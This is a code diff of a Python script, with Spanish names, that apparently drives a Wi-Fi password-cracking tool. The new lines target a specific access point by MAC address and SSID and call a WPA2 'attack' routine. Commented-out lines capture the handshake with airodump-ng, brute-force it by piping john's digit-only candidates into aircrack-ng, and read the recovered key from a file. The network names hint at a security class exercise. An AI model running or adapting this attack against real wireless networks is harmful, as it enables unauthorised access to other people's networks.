@@ -1,12 +1,19 @@
+import commands
 import os, sys
-import ap
-import wep
+from logica import wpa2,ap
+#import wep
 import subprocess
 import signal
 import time
-import wpa
+#import wpa
 
 if __name__ == '__main__':
+
+	red = ap.Ap('C0:25:E9:7C:5A:E0','2','Seguridad2019-wpa2','wpa2')
+	ataque = wpa2.Wpa2(red)
+	ataque.atacar()
+
+
 	"""
 	pro = subprocess.Popen(['ls','-l','datos/'],stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=False,preexec_fn=os.setsid)
 	salida,error = pro.communicate()
@@ -38,7 +45,7 @@ if __name__ == '__main__':
 	red = ap.Ap('58:A2:B5:D8:BA:79','6','SeguridadWpa','wpa')
 	ataque = wpa.Wpa(red)
 	ataque.atacar()
-"""
+
 	#result = subprocess.Popen(['airodump-ng', '--bssid', '58:A2:B5:D8:BA:79', '--channel', '6', '-w', 'prueba', 'wlan0mon'],stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=False)
 	result = subprocess.Popen(['john --incremental:Digits --stdout | aircrack-ng -b C0:25:E9:7C:5A:E0 datos/Seguridad2019-2/Seguridad2019-2-01.cap -w -'],stdout=subprocess.PIPE,stderr=subprocess.PIPE,shell=True,preexec_fn=os.setsid)
 	time.sleep(2)
@@ -48,3 +55,13 @@ if __name__ == '__main__':
 	sal,err = result.communicate()
 	print(str(sal.decode('utf-8')))
 	print(str(err.decode('utf-8')))
+	"""
+	"""
+	result = commands.getoutput('cat datos/Seguridad2019-2/Seguridad2019-2contrasena |grep "KEY"')
+	result = str(result)
+	result = result.replace('\n','')
+	if result == '':
+		print('vacio')
+	else:
+		print(result)
+	"""
